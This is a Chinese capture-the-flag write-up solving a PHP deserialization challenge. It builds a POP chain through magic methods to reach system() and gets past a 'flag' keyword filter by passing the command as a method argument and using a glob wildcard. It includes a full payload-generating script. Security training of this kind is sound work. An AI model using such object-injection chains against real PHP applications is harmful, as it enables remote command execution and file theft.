# 19 第十九章：星穹真相·补天归源

## 题目简述

本题给出四个存在继承关系的 PHP 类，要求组合 `__wakeup()`、`__invoke()`、`__destruct()` 和普通方法 `__Check()` 形成 POP 链。`__Check()` 会拦截自身属性中出现字符串 `flag` 的情况，因此命令不能直接保存在该对象的受检属性里，而要经其他对象传递为方法参数。

## 解题过程

最终目标位于 `PersonC::__Check()`：

```php
public function __Check($age)
{
    if (str_contains($this->age . $this->name, "flag")) {
        die("Hacker!");
    }

    $name = $this->name;
    $name($age);
}
```

令 `PersonC::$name = "system"`，就能把传入的 `$age` 当作系统命令执行。关键是让命令从参数进入，而不是写入 `PersonC::$age`，这样检查内容实际只有字符串 `system`。

可行的对象关系如下：

```text
PersonC::__wakeup()
  -> 调用 PersonB::__invoke(PersonC)
  -> 借 PersonB::$id 找到 PersonA
  -> 将 PersonA::$name 设为 PersonC
  -> 将 PersonA::$age 设为命令
PersonA::__destruct()
  -> PersonC->__Check(命令)
  -> system(命令)
```

生成载荷时只需提供同名类和相同的公有属性，方法由服务端已经定义的类负责执行：

```php
<?php
class PersonA {
    public $name;
    public $id;
    public $age;
}

class PersonB {
    public $name;
    public $id;
    public $age;
}

class PersonC {
    public $name;
    public $id;
    public $age;
}

$command = "cat /????";

$callable = new PersonC();
$callable->name = "system";

$destructor = new PersonA();
$destructor->name = $callable;
$destructor->id = "__Check";

$bridge = new PersonB();
$bridge->name = $command;
$bridge->id = $destructor;

$callable->id = $bridge;

echo urlencode(serialize($callable)), PHP_EOL;
```

将结果放到 `person` 参数中。反序列化时，`PersonC::__wakeup()` 先调用 `$bridge($callable)`。继承自 `Person` 的 `__invoke()` 把 `$destructor->age` 设置为 `$bridge->name`，即命令 `cat /????`。请求结束后 `PersonA::__destruct()` 调用 `$callable->__Check($command)`，进而执行 `system($command)`。

这里用 `/????` 匹配 `/flag`，既能读到目标文件，又避免命令字符串本身出现 `flag`。更重要的是，过滤器实际检查的是 `PersonC::$age . PersonC::$name`，命令始终作为参数传入，因而不会触发拦截。

## 方法总结

这条链的核心是“跨对象搬运数据”：`__wakeup()` 负责启动，`__invoke()` 将命令写入析构对象，`__destruct()` 把命令改为方法参数，最后 `__Check()` 调用可控函数名。分析复杂 POP 链时，分别记录每个 gadget 的触发时机、读哪些属性、写哪些属性，比直接试凑序列化字符串更可靠。
